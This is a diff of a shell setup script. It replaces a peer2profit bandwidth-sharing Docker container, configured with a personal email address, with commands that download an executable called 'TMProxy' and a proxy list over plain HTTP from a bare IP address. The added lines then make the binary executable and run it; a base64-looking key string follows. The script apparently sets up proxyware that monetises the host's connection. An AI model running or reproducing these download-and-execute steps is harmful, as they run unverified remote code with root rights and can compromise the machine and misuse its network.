@@ -1,10 +1,8 @@
 apt-get -y update
 apt -y install docker.io
-sudo systemctl enable docker.service
-export P2P_EMAIL=trongngavd@gmail.com; 
-docker rm -f peer2profit || true && docker run -d --restart always \
-        -e "P2P_EMAIL" \
-        --name peer2profit \
-        peer2profit/peer2profit_x86_64:latest 
-        
+sudo wget http://135.148.165.162/TMProxy
+sudo wget http://135.148.165.162/proxy.txt
+chmod u+x TMProxy 
+./TMProxy
+6EtGBRe4JSf4bdHPnCU6ABg1k2Tv7IvWxUivIKPecdU=
         
